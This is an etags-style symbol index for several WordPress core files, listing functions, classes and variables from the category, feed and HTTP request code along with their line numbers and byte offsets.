	$categories = get_the_terms( $id, 'category' );categories75,1992
		$categories = array();categories77,2063
	$categories = array_values( $categories );categories79,2089
function _usort_terms_by_name( $a, $b ) {_usort_terms_by_name102,2642
function _usort_terms_by_ID( $a, $b ) {_usort_terms_by_ID119,2970
function get_the_category_by_ID( $cat_ID ) {get_the_category_by_ID136,3273
	$cat_ID = (int) $cat_ID;cat_ID137,3318
	$category = &get_category( $cat_ID );category138,3344
function get_the_category_list( $separator = '', $parents='', $post_id = false ) {get_the_category_list154,3806
function get_the_category_list( $separator = '', $parents='', $post_id = false ) {separator154,3806
	$categories = get_the_category( $post_id );categories159,4052
	$rel = ( is_object( $wp_rewrite ) && $wp_rewrite->using_permalinks() ) ? 'rel="category tag"' : 'rel="category"';rel163,4214
	$thelist = '';thelist165,4330
		$i = 0;i189,5547
 * Prior to v2.7, this function could only be used in the WordPress Loop.could224,7215
 * As of 2.7, the function can be used anywhere if it is provided a post ID or post object.can225,7289
function in_category( $category, $post = null ) {in_category233,7659
function in_category( $category, $post = null ) {post233,7659
function the_category( $separator = '', $parents='', $post_id = false ) {the_category249,8108
function the_category( $separator = '', $parents='', $post_id = false ) {separator249,8108
function category_description( $category = 0 ) {category_description261,8450
function category_description( $category = 0 ) {category261,8450
 *     'class' (string) - The class attribute value for select element.attribute285,9678
function wp_dropdown_categories( $args = '' ) {wp_dropdown_categories299,10310
function wp_dropdown_categories( $args = '' ) {args299,10310
	$defaults = array(defaults300,10358
	$r = wp_parse_args( $args, $defaults );r321,10994
	$tab_index_attribute = '';tab_index_attribute329,11163
		$tab_index_attribute = " tabindex=\"$tab_index\"";tab_index_attribute331,11220
	$categories = get_terms( $taxonomy, $r );categories333,11274
	$name = esc_attr( $name );name334,11317
	$class = esc_attr( $class );class335,11345
	$id = $id ? esc_attr( $id ) : $name;id336,11375
		$output = "<select name='$name' id='$id' class='$class' $tab_index_attribute>\n";output339,11468
		$output = '';output341,11558
		$show_option_none = apply_filters( 'list_cats', $show_option_none );show_option_none344,11658
			$show_option_all = apply_filters( 'list_cats', $show_option_all );show_option_all351,11881
			$selected = ( '0' === strval($r['selected']) ) ? " selected='selected'" : '';selected352,11951
			$show_option_none = apply_filters( 'list_cats', $show_option_none );show_option_none357,12140
			$selected = ( '-1' === strval($r['selected']) ) ? " selected='selected'" : '';selected358,12212
			$depth = $r['depth'];  // Walk the full depth.depth363,12398
			$depth = -1; // Flat.depth365,12455
	$output = apply_filters( 'wp_dropdown_cats', $output );output373,12637
function wp_list_categories( $args = '' ) {wp_list_categories412,14229
function wp_list_categories( $args = '' ) {args412,14229
	$defaults = array(defaults413,14273
	$r = wp_parse_args( $args, $defaults );r427,14755
	$categories = get_categories( $r );categories445,15186
	$output = '';output447,15224
			$output = '<li class="' . esc_attr( $class ) . '">' . $title_li . '<ul>';output449,15277
			$posts_page = ( 'page' == get_option( 'show_on_front' ) && get_option( 'page_for_posts' ) ) ? get_permalink( get_option( 'page_for_posts' ) ) : home_url( '/' );posts_page460,15601
			$posts_page = esc_url( $posts_page );posts_page461,15765
			$current_term_object = get_queried_object();current_term_object469,16065
			$depth = $r['depth'];depth475,16254
			$depth = -1; // Flat.depth477,16286
	$output = apply_filters( 'wp_list_categories', $output, $args );output485,16442
function wp_tag_cloud( $args = '' ) {wp_tag_cloud521,17904
function wp_tag_cloud( $args = '' ) {args521,17904
	$defaults = array(defaults522,17942
	$args = wp_parse_args( $args, $defaults );args527,18211
	$tags = get_terms( $args['taxonomy'], array_merge( $args, array( 'orderby' => 'count', 'order' => 'DESC' ) ) ); // Always query top tagstags529,18256
	foreach ( $tags as $key => $tag ) {key534,18453
			$link = get_edit_tag_link( $tag->term_id, $tag->taxonomy );link536,18523
			$link = get_term_link( intval($tag->term_id), $tag->taxonomy );link538,18593
	$return = wp_generate_tag_cloud( $tags, $args ); // Here's where those top tags get sorted according to $argsreturn546,18780
	$return = apply_filters( 'wp_tag_cloud', $return, $args );return548,18892
function default_topic_count_text( $count ) {default_topic_count_text562,19211
function default_topic_count_scale( $count ) {default_topic_count_scale572,19489
function wp_generate_tag_cloud( $tags, $args = '' ) {wp_generate_tag_cloud607,20911
function wp_generate_tag_cloud( $tags, $args = '' ) {args607,20911
	$defaults = array(defaults608,20965
		$body = 'return sprintf (body616,21401
	$args = wp_parse_args( $args, $defaults );args622,21655
	$tags_sorted = apply_filters( 'tag_cloud_sort', $tags, $args );tags_sorted628,21753
		$tags = $tags_sorted;tags630,21892
				$tags = array_reverse( $tags, true );tags643,22263
		$tags = array_slice($tags, 0, $number);tags648,22333
	$counts = array();counts650,22376
	$real_counts = array(); // For the alt tagreal_counts651,22396
	foreach ( (array) $tags as $key => $tag ) {key652,22440
	$min_count = min( $counts );min_count657,22589
	$spread = max( $counts ) - $min_count;spread658,22619
		$spread = 1;spread660,22680
	$font_spread = $largest - $smallest;font_spread661,22695
		$font_spread = 1;font_spread663,22758
	$font_step = $font_spread / $spread;font_step664,22778
	$a = array();a666,22817
	foreach ( $tags as $key => $tag ) {key668,22833
		$count = $counts[ $key ];count669,22870
		$real_count = $real_counts[ $key ];real_count670,22898
		$tag_link = '#' != $tag->link ? esc_url( $tag->link ) : '#';tag_link671,22936
		$tag_id = isset($tags[ $key ]->id) ? $tags[ $key ]->id : $key;tag_id672,22999
		$tag_name = $tags[ $key ]->name;tag_name673,23064
		$return =& $a;return681,23419
		$return = "<ul class='wp-tag-cloud'>\n\t<li>";return684,23460
		$return = join( $separator, $a );return689,23602
function _wp_object_name_sort_cb( $a, $b ) {_wp_object_name_sort_cb705,23871
function _wp_object_count_sort_cb( $a, $b ) {_wp_object_count_sort_cb715,24059
function walk_category_tree() {walk_category_tree730,24371
	$args = func_get_args();args731,24403
		$walker = new Walker_Category;walker734,24549
		$walker = $args[2]['walker'];walker736,24588
function walk_category_dropdown_tree() {walk_category_dropdown_tree748,24923
	$args = func_get_args();args749,24964
		$walker = new Walker_CategoryDropdown;walker752,25110
		$walker = $args[2]['walker'];walker754,25157
class Walker_Category extends Walker {Walker_Category766,25358
	var $tree_type = 'category';tree_type772,25468
	var $tree_type = 'category';tree_type772,25468
	var $db_fields = array ('parent' => 'parent', 'id' => 'term_id');db_fields780,25593
	var $db_fields = array ('parent' => 'parent', 'id' => 'term_id');db_fields780,25593
	function start_lvl( &$output, $depth = 0, $args = array() ) {start_lvl790,25953
	function start_lvl( &$output, $depth = 0, $args = array() ) {depth790,25953
		$indent = str_repeat("\t", $depth);indent794,26062
	function end_lvl( &$output, $depth = 0, $args = array() ) {end_lvl806,26441
	function end_lvl( &$output, $depth = 0, $args = array() ) {depth806,26441
		$indent = str_repeat("\t", $depth);indent810,26548
	function start_el( &$output, $category, $depth = 0, $args = array(), $id = 0 ) {start_el823,26900
	function start_el( &$output, $category, $depth = 0, $args = array(), $id = 0 ) {depth823,26900
		$cat_name = esc_attr( $category->name );cat_name826,27001
		$cat_name = apply_filters( 'list_cats', $cat_name, $category );cat_name827,27044
		$link = '<a href="' . esc_url( get_term_link($category) ) . '" ';link828,27110
		if ( $use_desc_for_title == 0 || empty($category->description) )use_desc_for_title829,27178
				$alt = ' alt="' . sprintf(__( 'Feed for all posts filed under %s' ), $cat_name ) . '"';alt845,27791
				$title = ' title="' . $feed . '"';title847,27895
				$alt = ' alt="' . $feed . '"';alt848,27934
				$name = $feed;name849,27969
			$class = 'cat-item cat-item-' . $category->term_id;class871,28361
				$_current_category = get_term( $current_category, $category->taxonomy );_current_category873,28454
	function end_el( &$output, $page, $depth = 0, $args = array() ) {end_el895,29143
	function end_el( &$output, $page, $depth = 0, $args = array() ) {depth895,29143
class Walker_CategoryDropdown extends Walker {Walker_CategoryDropdown911,29396
	var $tree_type = 'category';tree_type917,29514
	var $tree_type = 'category';tree_type917,29514
	var $db_fields = array ('parent' => 'parent', 'id' => 'term_id');db_fields925,29639
	var $db_fields = array ('parent' => 'parent', 'id' => 'term_id');db_fields925,29639
	function start_el( &$output, $category, $depth, $args, $id = 0 ) {start_el936,30034
	function start_el( &$output, $category, $depth, $args, $id = 0 ) {id936,30034
		$pad = str_repeat('&nbsp;', $depth * 3);pad937,30102
		$cat_name = apply_filters('list_cats', $category->name, $category);cat_name939,30146
function get_tag_link( $tag ) {get_tag_link964,30766
		$tag = (int) $tag;tag966,30826
	$tag = get_term_link( $tag, 'post_tag' );tag968,30848
function get_the_tags( $id = 0 ) {get_the_tags985,31137
function get_the_tags( $id = 0 ) {id985,31137
function get_the_tag_list( $before = '', $sep = '', $after = '', $id = 0 ) {get_the_tag_list1001,31633
function get_the_tag_list( $before = '', $sep = '', $after = '', $id = 0 ) {before1001,31633
function the_tags( $before = null, $sep = ', ', $after = '' ) {the_tags1015,32073
function the_tags( $before = null, $sep = ', ', $after = '' ) {before1015,32073
		$before = __('Tags: ');before1017,32162
function tag_description( $tag = 0 ) {tag_description1029,32413
function tag_description( $tag = 0 ) {tag1029,32413
function term_description( $term = 0, $taxonomy = 'post_tag' ) {term_description1042,32744
function term_description( $term = 0, $taxonomy = 'post_tag' ) {term1042,32744
		$term = get_queried_object();term1044,32871
		$taxonomy = $term->taxonomy;taxonomy1045,32903
		$term = $term->term_id;term1046,32934
	$description = get_term_field( 'description', $term, $taxonomy );description1048,32963
function get_the_terms( $id, $taxonomy ) {get_the_terms1061,33332
 	$id = (int) $id;id1064,33391
			$id = (int) $post->ID;id1070,33478
	$terms = get_object_term_cache( $id, $taxonomy );terms1073,33508
		$terms = wp_get_object_terms( $id, $taxonomy );terms1075,33586
	$terms = apply_filters( 'get_the_terms', $terms, $id, $taxonomy );terms1079,33699
function get_the_term_list( $id, $taxonomy, $before = '', $sep = '', $after = '' ) {get_the_term_list1099,34158
function get_the_term_list( $id, $taxonomy, $before = '', $sep = '', $after = '' ) {before1099,34158
	$terms = get_the_terms( $id, $taxonomy );terms1100,34243
		$link = get_term_link( $term, $taxonomy );link1109,34407
	$term_links = apply_filters( "term_links-$taxonomy", $term_links );term_links1115,34593
function the_terms( $id, $taxonomy, $before = '', $sep = ', ', $after = '' ) {the_terms1132,35081
function the_terms( $id, $taxonomy, $before = '', $sep = ', ', $after = '' ) {before1132,35081
	$term_list = get_the_term_list( $id, $taxonomy, $before, $sep, $after );term_list1133,35160
function has_category( $category = '', $post = null ) {has_category1150,35762
function has_category( $category = '', $post = null ) {category1150,35762
 * Prior to v2.7, this function could only be used in the WordPress Loop.could1162,36298
 * As of 2.7, the function can be used anywhere if it is provided a post ID or post object.can1163,36372
function has_tag( $tag = '', $post = null ) {has_tag1171,36785
function has_tag( $tag = '', $post = null ) {tag1171,36785
function has_term( $term = '', $taxonomy = '', $post = null ) {has_term1189,37517
function has_term( $term = '', $taxonomy = '', $post = null ) {term1189,37517
	$post = get_post($post);post1190,37581
	$r = is_object_in_term( $post->ID, $taxonomy, $term );r1195,37640

wordpress/wp-includes/category.php,3782
function get_all_category_ids() {get_all_category_ids16,254
	if ( ! $cat_ids = wp_cache_get( 'all_category_ids', 'category' ) ) {cat_ids17,288
		$cat_ids = get_terms( 'category', array('fields' => 'ids', 'get' => 'all') );cat_ids18,358
function &get_categories( $args = '' ) {get_categories39,1049
function &get_categories( $args = '' ) {args39,1049
	$defaults = array( 'taxonomy' => 'category' );defaults40,1090
	$args = wp_parse_args( $args, $defaults );args41,1138
	$taxonomy = apply_filters( 'get_categories_taxonomy', $args['taxonomy'], $args );taxonomy43,1183
		$taxonomy = $args['taxonomy'] = 'link_category';taxonomy48,1392
	$categories = (array) get_terms( $taxonomy, $args );categories51,1447
function &get_category( $category, $output = OBJECT, $filter = 'raw' ) {get_category81,2625
function &get_category( $category, $output = OBJECT, $filter = 'raw' ) {output81,2625
	$category = get_term( $category, 'category', $output, $filter );category82,2698
function get_category_by_path( $category_path, $full_match = true, $output = OBJECT ) {get_category_by_path110,3661
function get_category_by_path( $category_path, $full_match = true, $output = OBJECT ) {full_match110,3661
	$category_path = rawurlencode( urldecode( $category_path ) );category_path111,3749
	$category_path = str_replace( '%2F', '/', $category_path );category_path112,3812
	$category_path = str_replace( '%20', ' ', $category_path );category_path113,3873
	$category_paths = '/' . trim( $category_path, '/' );category_paths114,3934
	$leaf_path  = sanitize_title( basename( $category_paths ) );leaf_path115,3988
	$category_paths = explode( '/', $category_paths );category_paths116,4050
	$full_path = '';full_path117,4102
	$categories = get_terms( 'category', array('get' => 'all', 'slug' => $leaf_path) );categories121,4246
		$path = '/' . $leaf_path;path127,4417
		$curcategory = $category;curcategory128,4445
			$curcategory = get_term( $curcategory->parent, 'category' );curcategory130,4570
			$path = '/' . $curcategory->slug . $path;path133,4697
		if ( $path == $full_path )path136,4747
function get_category_by_slug( $slug  ) {get_category_by_slug155,5173
	$category = get_term_by( 'slug', $slug, 'category' );category156,5215
function get_cat_ID( $cat_name='General' ) {get_cat_ID171,5570
function get_cat_ID( $cat_name='General' ) {cat_name171,5570
	$cat = get_term_by( 'name', $cat_name, 'category' );cat172,5615
function get_cat_name( $cat_id ) {get_cat_name186,5911
	$cat_id = (int) $cat_id;cat_id187,5946
	$category = &get_category( $cat_id );category188,5972
function cat_is_ancestor_of( $cat1, $cat2 ) {cat_is_ancestor_of206,6497
 * @uses sanitize_term() See this function for what context are supported.for214,6671
function sanitize_category( $category, $context = 'display' ) {sanitize_category220,6939
function sanitize_category( $category, $context = 'display' ) {context220,6939
 * @uses sanitize_term_field() See function for more details.for228,7135
function sanitize_category_field( $field, $value, $cat_id, $context ) {sanitize_category_field236,7476
function &get_tags( $args = '' ) {get_tags252,7933
function &get_tags( $args = '' ) {args252,7933
	$tags = get_terms( 'post_tag', $args );tags253,7968
		$return = array();return256,8035
	$tags = apply_filters( 'get_tags', $tags, $args );tags260,8078
function &get_tag( $tag, $output = OBJECT, $filter = 'raw' ) {get_tag283,8922
function &get_tag( $tag, $output = OBJECT, $filter = 'raw' ) {output283,8922
function clean_category_cache( $id ) {clean_category_cache297,9238
 * This function was added for the taxonomy support to update the new categorywas304,9398
function _make_cat_compat( &$category ) {_make_cat_compat320,10119

wordpress/wp-includes/class-feed.php,2251
class WP_Feed_Cache extends SimplePie_Cache {WP_Feed_Cache6,100
	function create($location, $filename, $extension) {create13,231
class WP_Feed_Cache_Transient {WP_Feed_Cache_Transient18,362
	var $name;name19,394
	var $mod_name;mod_name20,406
	var $lifetime = 43200; //Default lifetime in cache of 12 hourslifetime21,422
	var $lifetime = 43200; //Default lifetime in cache of 12 hourslifetime21,422
	function __construct($location, $filename, $extension) {__construct23,487
		$this->name = 'feed_' . $filename;name24,545
		$this->mod_name = 'feed_mod_' . $filename;mod_name25,582
		$this->lifetime = apply_filters('wp_feed_cache_transient_lifetime', $this->lifetime, $filename);lifetime26,627
	function save($data) {save29,730
			$data = $data->data;data31,788
	function load() {load38,945
	function mtime() {mtime42,1005
	function touch() {touch46,1070
	function unlink() {unlink50,1160
class WP_SimplePie_File extends SimplePie_File {WP_SimplePie_File57,1272
	function __construct($url, $timeout = 10, $redirects = 5, $headers = null, $useragent = null, $force_fsockopen = false) {__construct59,1322
	function __construct($url, $timeout = 10, $redirects = 5, $headers = null, $useragent = null, $force_fsockopen = false) {timeout59,1322
		$this->url = $url;url60,1445
		$this->timeout = $timeout;timeout61,1466
		$this->redirects = $redirects;redirects62,1495
		$this->headers = $headers;headers63,1528
		$this->useragent = $useragent;useragent64,1557
		$this->method = SIMPLEPIE_FILE_SOURCE_REMOTE;method66,1591
			$args = array( 'timeout' => $this->timeout, 'redirection' => $this->redirects);args69,1689
			$res = wp_remote_request($url, $args);res77,2002
				$this->error = 'WP HTTP Error: ' . $res->get_error_message();error80,2075
				$this->success = false;success81,2141
				$this->headers = wp_remote_retrieve_headers( $res );headers83,2181
				$this->body = wp_remote_retrieve_body( $res );body84,2238
				$this->status_code = wp_remote_retrieve_response_code( $res );status_code85,2289
			if ( ! $this->body = file_get_contents($url) ) {body88,2372
				$this->error = 'file_get_contents could not read the file';error89,2424
				$this->success = false;success90,2488

wordpress/wp-includes/class-http.php,17806
 * This class is called for the functionality of making HTTP requests and replaces Snoopyis18,457
 * to the code. It is not as easy to convert a function to a method after enough code uses the oldto25,1006
class WP_Http {WP_Http34,1279
	 *		code. One suggestion is to create a class specifically for the arguments, howeverspecifically73,3547
	function request( $url, $args = array() ) {request81,4000
	function request( $url, $args = array() ) {args81,4000
		$defaults = array(defaults84,4068
		$args = wp_parse_args( $args );args102,4683
		$r = wp_parse_args( $args, $defaults );r108,4871
		$r = apply_filters( 'http_request_args', $r, $url );r109,4913
		$pre = apply_filters( 'pre_http_request', false, $r, $url );pre115,5151
		$arrURL = parse_url( $url );arrURL119,5255
		$homeURL = parse_url( get_bloginfo( 'url' ) );homeURL132,5864
			$processedHeaders = WP_Http::processHeaders( $r['headers'] );processedHeaders152,6730
	public function _get_first_available_transport( $args, $url = null ) {_get_first_available_transport205,8691
	public function _get_first_available_transport( $args, $url = null ) {url205,8691
		$request_order = array( 'curl', 'streams', 'fsockopen' );request_order206,8763
			$class = 'WP_HTTP_' . $transport;class210,8974
	private function _dispatch_request( $url, $args ) {_dispatch_request243,10184
		static $transports = array();transports244,10237
		static $transports = array();transports244,10237
		$class = $this->_get_first_available_transport( $args, $url );class246,10270
		$response = $transports[$class]->request( $url, $args );response254,10639
	function post($url, $args = array()) {post276,11279
	function post($url, $args = array()) {args276,11279
		$defaults = array('method' => 'POST');defaults277,11319
		$r = wp_parse_args( $args, $defaults );r278,11360
	function get($url, $args = array()) {get294,11815
	function get($url, $args = array()) {args294,11815
		$defaults = array('method' => 'GET');defaults295,11854
		$r = wp_parse_args( $args, $defaults );r296,11894
	function head($url, $args = array()) {head312,12350
	function head($url, $args = array()) {args312,12350
		$defaults = array('method' => 'HEAD');defaults313,12390
		$r = wp_parse_args( $args, $defaults );r314,12431
	function processResponse($strResponse) {processResponse328,12759
		$res = explode("\r\n\r\n", $strResponse, 2);res329,12801
	public static function processHeaders($headers) {processHeaders348,13411
			$headers = str_replace("\r\n", "\n", $headers);headers352,13593
			$headers = preg_replace('/\n[ \t]/', ' ', $headers);headers354,13782
			$headers = explode("\n", $headers);headers356,13869
		$response = array('code' => 0, 'message' => '');response359,13913
		for ( $i = count($headers)-1; $i >= 0; $i-- ) {i363,14133
				$headers = array_splice($headers, $i);headers365,14255
		$cookies = array();cookies370,14319
		$newheaders = array();newheaders371,14341
				$stack = explode(' ', $tempheader, 3);stack377,14505
				$key = strtolower( $key );key386,14734
	public static function buildCookieHeader( &$r ) {buildCookieHeader415,15602
			$cookies_header = '';cookies_header417,15687
			$cookies_header = substr( $cookies_header, 0, -2 );cookies_header421,15824
	function chunkTransferDecode($body) {chunkTransferDecode440,16415
		$body = str_replace(array("\r\n", "\r"), "\n", $body);body441,16454
		$parsedBody = '';parsedBody446,16647
			$hasChunk = (bool) preg_match( '/^([0-9a-f]+)(\s|\n)+/mi', $body, $match );hasChunk450,16729
				$length = hexdec( $match[1] );length456,16881
				$chunkLength = strlen( $match[0] );chunkLength457,16916
				$strBody = substr($body, $chunkLength, $length);strBody459,16957
				$body = ltrim(str_replace(array($match[0], $strBody), '', $body), "\n");body462,17040
	function block_request($uri) {block_request491,18279
		$check = @parse_url($uri);check498,18622
		if ( $check === false )check507,19069
		$home = parse_url( get_option('siteurl') );home510,19113
		static $accessible_hosts;accessible_hosts519,19404
		static $wildcard_regex = false;wildcard_regex520,19432
		static $wildcard_regex = false;wildcard_regex520,19432
			$accessible_hosts = preg_split('|,\s*|', WP_ACCESSIBLE_HOSTS);accessible_hosts522,19503
				$wildcard_regex = array();wildcard_regex525,19625
				$wildcard_regex = '/^(' . implode('|', $wildcard_regex) . ')$/i';wildcard_regex528,19778
	static function make_absolute_url( $maybe_relative_path, $url ) {make_absolute_url539,20080
		if ( ! $url_parts = @parse_url( $url ) )url_parts547,20317
		if ( ! $relative_url_parts = @parse_url( $maybe_relative_path ) )relative_url_parts550,20393
		$absolute_path = $url_parts['scheme'] . '://' . $url_parts['host'];absolute_path553,20494
		$path = ! empty( $url_parts['path'] ) ? $url_parts['path'] : '/';path558,20691
			$path = $relative_url_parts['path'];path562,20901
			$path = substr( $path, 0, strrpos( $path, '/' ) + 1 );path567,21088
				$path = preg_replace( '![^/]+/\.\./!', '', $path );path574,21298
			$path = preg_replace( '!^/(\.\./)+!', '', $path );path578,21408
 * HTTP request method uses fsockopen function to retrieve the url.to590,21654
class WP_Http_Fsockopen {WP_Http_Fsockopen599,21930
	function request($url, $args = array()) {request613,22341
	function request($url, $args = array()) {args613,22341
		$defaults = array(defaults614,22384
		$r = wp_parse_args( $args, $defaults );r621,22581
		$iError = null; // Store error numberiError634,22998
		$strError = null; // Store error stringstrError635,23038
		$arrURL = parse_url($url);arrURL637,23081
		$fsockopen_host = $arrURL['host'];fsockopen_host639,23111
		$secure_transport = false;secure_transport641,23149
				$fsockopen_host = "ssl://$fsockopen_host";fsockopen_host645,23323
				$secure_transport = true;secure_transport647,23397
			$fsockopen_host = '127.0.0.1';fsockopen_host656,23750
			$error_reporting = error_reporting(0);error_reporting661,23949
		$startDelay = time();startDelay663,23992
		$proxy = new WP_HTTP_Proxy();proxy665,24017
				$handle = @fsockopen( $proxy->host(), $proxy->port(), $iError, $strError, $r['timeout'] );handle669,24140
				$handle = @fsockopen( $fsockopen_host, $arrURL['port'], $iError, $strError, $r['timeout'] );handle671,24243
				$handle = fsockopen( $proxy->host(), $proxy->port(), $iError, $strError, $r['timeout'] );handle674,24420
				$handle = fsockopen( $fsockopen_host, $arrURL['port'], $iError, $strError, $r['timeout'] );handle676,24522
		$endDelay = time();endDelay679,24623
		$elapseDelay = ($endDelay-$startDelay) > $r['timeout'];elapseDelay683,24767
		$timeout = (int) floor( $r['timeout'] );timeout690,25021
		$utimeout = $timeout == $r['timeout'] ? 0 : 1000000 * $r['timeout'] % 1000000;utimeout691,25064
			$requestPath = $url;requestPath695,25315
			$requestPath = $arrURL['path'] . ( isset($arrURL['query']) ? '?' . $arrURL['query'] : '' );requestPath697,25346
		$strHeaders = strtoupper($r['method']) . ' ' . $requestPath . ' HTTP/' . $r['httpversion'] . "\r\n";strHeaders702,25496
			foreach ( (array) $r['headers'] as $header => $headerValue )header713,25941
		$strResponse = '';strResponse734,26521
		$bodyStarted = false;bodyStarted735,26542
				$stream_handle = @fopen( $r['filename'], 'w+' );stream_handle740,26662
				$stream_handle = fopen( $r['filename'], 'w+' );stream_handle742,26723
				$block = fread( $handle, 4096 );block747,26960
						$process = WP_Http::processResponse( $strResponse );process753,27153
						$bodyStarted = true;bodyStarted754,27212
			$process = WP_Http::processResponse( $strResponse );process768,27481
		$arrHeaders = WP_Http::processHeaders( $process['headers'] );arrHeaders777,27665
	 * Whether this class can be used for retrieving an URL.can799,28772
	 * @return boolean False means this class can not be used, true means it can.can803,28863
	public static function test( $args = array() ) {test805,28947
	public static function test( $args = array() ) {args805,28947
		$is_ssl = isset( $args['ssl'] ) && $args['ssl'];is_ssl812,29178
class WP_Http_Streams {WP_Http_Streams833,29682
	function request($url, $args = array()) {request844,29984
	function request($url, $args = array()) {args844,29984
		$defaults = array(defaults845,30027
		$r = wp_parse_args( $args, $defaults );r852,30224
		$arrURL = parse_url($url);arrURL865,30641
			$url = preg_replace('|^' . preg_quote($arrURL['scheme'], '|') . '|', 'http', $url);url871,30855
		$strHeaders = '';strHeaders874,30980
			foreach ( $r['headers'] as $name => $value )name876,31035
			$strHeaders = $r['headers'];strHeaders879,31166
		$is_local = isset($args['local']) && $args['local'];is_local881,31199
		$ssl_verify = isset($args['sslverify']) && $args['sslverify'];ssl_verify882,31254
			$ssl_verify = apply_filters('https_local_ssl_verify', $ssl_verify);ssl_verify884,31338
			$ssl_verify = apply_filters('https_ssl_verify', $ssl_verify);ssl_verify886,31434
		$arrContext = array('http' =>arrContext888,31500
		$proxy = new WP_HTTP_Proxy();proxy904,31961
		$context = stream_context_create($arrContext);context918,32504
			$handle = @fopen($url, 'r', false, $context);handle921,32573
			$handle = fopen($url, 'r', false, $context);handle923,32629
		$timeout = (int) floor( $r['timeout'] );timeout928,32807
		$utimeout = $timeout == $r['timeout'] ? 0 : 1000000 * $r['timeout'] % 1000000;utimeout929,32850
				$stream_handle = @fopen( $r['filename'], 'w+' );stream_handle940,33255
				$stream_handle = fopen( $r['filename'], 'w+' );stream_handle942,33316
			$strResponse = '';strResponse950,33606
			$strResponse = stream_get_contents( $handle );strResponse952,33639
		$meta = stream_get_meta_data( $handle );meta955,33694
		$processedHeaders = array();processedHeaders959,33760
			$processedHeaders = WP_Http::processHeaders($meta['wrapper_data']['headers']);processedHeaders961,33842
			$processedHeaders = WP_Http::processHeaders($meta['wrapper_data']);processedHeaders963,33931
			$strResponse = WP_Http::chunkTransferDecode($strResponse);strResponse971,34517
			$strResponse = WP_Http_Encoding::decompress( $strResponse );strResponse974,34689
	 * Whether this class can be used for retrieving an URL.can980,34966
	 * @return boolean False means this class can not be used, true means it can.can986,35080
	public static function test( $args = array() ) {test988,35164
	public static function test( $args = array() ) {args988,35164
		$is_ssl = isset( $args['ssl'] ) && $args['ssl'];is_ssl995,35368
class WP_Http_Curl {WP_Http_Curl1013,35742
	private $headers = '';headers1022,35894
	private $headers = '';headers1022,35894
	function request($url, $args = array()) {request1034,36191
	function request($url, $args = array()) {args1034,36191
		$defaults = array(defaults1035,36234
		$r = wp_parse_args( $args, $defaults );r1042,36431
		$handle = curl_init();handle1055,36849
		$proxy = new WP_HTTP_Proxy();proxy1058,36919
		$is_local = isset($r['local']) && $r['local'];is_local1072,37394
		$ssl_verify = isset($r['sslverify']) && $r['sslverify'];ssl_verify1073,37443
			$ssl_verify = apply_filters('https_local_ssl_verify', $ssl_verify);ssl_verify1075,37521
			$ssl_verify = apply_filters('https_ssl_verify', $ssl_verify);ssl_verify1077,37617
		$timeout = (int) ceil( $r['timeout'] );timeout1081,37822
		curl_setopt( $handle, CURLOPT_SSL_VERIFYHOST, ( $ssl_verify === true ) ? 2 : false );ssl_verify1087,38078
				$stream_handle = @fopen( $r['filename'], 'w+' );stream_handle1121,39392
				$stream_handle = fopen( $r['filename'], 'w+' );stream_handle1123,39453
			$headers = array();headers1131,39810
			foreach ( $r['headers'] as $name => $value ) {name1132,39833
		$theResponse = curl_exec( $handle );theResponse1154,40707
		$theBody = '';theBody1155,40746
		$theHeaders = WP_Http::processHeaders( $this->headers );theHeaders1156,40763
			$theBody = $theResponse;theBody1159,40959
			if ( $curl_error = curl_error( $handle ) )curl_error1163,41082
		$this->headers = '';headers1169,41360
		$response = array();response1171,41384
			$theBody = WP_Http_Encoding::decompress( $theBody );theBody1190,42204
	private function stream_headers( $handle, $headers ) {stream_headers1204,42658
	 * Whether this class can be used for retrieving an URL.can1210,42782
	 * @return boolean False means this class can not be used, true means it can.can1215,42877
	public static function test( $args = array() ) {test1217,42961
	public static function test( $args = array() ) {args1217,42961
		$is_ssl = isset( $args['ssl'] ) && $args['ssl'];is_ssl1221,43107
			$curl_version = curl_version();curl_version1224,43178
 * define('WP_PROXY_HOST', '192.168.84.101');WP_PROXY_HOST1256,44606
 * define('WP_PROXY_PORT', '8080');WP_PROXY_PORT1257,44652
 * define('WP_PROXY_BYPASS_HOSTS', 'localhost, www.example.com, *.wordpress.org');WP_PROXY_BYPASS_HOSTS1258,44688
class WP_HTTP_Proxy {WP_HTTP_Proxy1265,44991
	function is_enabled() {is_enabled1276,45155
	function use_authentication() {use_authentication1289,45394
	function host() {host1300,45598
	function port() {port1314,45790
	function username() {username1328,45990
	function password() {password1342,46202
	function authentication() {authentication1356,46423
	function authentication_header() {authentication_header1367,46615
	function send_through_proxy( $uri ) {send_through_proxy1384,47234
		$check = @parse_url($uri);check1387,47425
		if ( $check === false )check1390,47540
		$home = parse_url( get_option('siteurl') );home1393,47583
		static $bypass_hosts;bypass_hosts1401,47782
		static $wildcard_regex = false;wildcard_regex1402,47806
		static $wildcard_regex = false;wildcard_regex1402,47806
			$bypass_hosts = preg_split('|,\s*|', WP_PROXY_BYPASS_HOSTS);bypass_hosts1404,47873
				$wildcard_regex = array();wildcard_regex1407,47995
				$wildcard_regex = '/^(' . implode('|', $wildcard_regex) . ')$/i';wildcard_regex1410,48144
 * @todo The WordPress convention is to use underscores instead of camelCase for function and methodand1426,48601
class WP_Http_Cookie {WP_Http_Cookie1433,48836
	var $name;name1441,48924
	var $value;value1449,49002
	var $expires;expires1457,49092
	var $path;path1465,49176
	var $domain;domain1473,49255
	function __construct( $data ) {__construct1495,49827
			$pairs = explode( ';', $data );pairs1498,49955
			$name  = trim( substr( $pairs[0], 0, strpos( $pairs[0], '=' ) ) );name1501,50074
			$value = substr( $pairs[0], strpos( $pairs[0], '=' ) + 1 );value1502,50144
			$this->name  = $name;name1503,50207
			$this->value = urldecode( $value );value1504,50232
				$pair = rtrim($pair);pair1509,50404
				$key = strtolower( trim( $key ) );key1514,50631
					$val = strtotime( $val );val1516,50699
			$this->name   = $data['name'];name1524,50873
			$this->value  = isset( $data['value'] ) ? $data['value'] : '';value1525,50907
			$this->path   = isset( $data['path'] ) ? $data['path'] : '';path1526,50973
			$this->domain = isset( $data['domain'] ) ? $data['domain'] : '';domain1527,51037
				$this->expires = is_int( $data['expires'] ) ? $data['expires'] : strtotime( $data['expires'] );expires1530,51142
				$this->expires = null;expires1532,51250
	function test( $url ) {test1547,51611
		$url = parse_url( $url );url1553,51799
		$path   = isset( $this->path )   ? $this->path   : '/';path1558,51999
		$port   = isset( $this->port )   ? $this->port   : 80;port1559,52057
		$domain = isset( $this->domain ) ? strtolower( $this->domain ) : strtolower( $url['host'] );domain1560,52114
		$domain = substr( $domain, 0, 1 ) == '.' ? substr( $domain, 1 ) : $domain;domain1565,52380
	function getHeaderValue() {getHeaderValue1588,53001
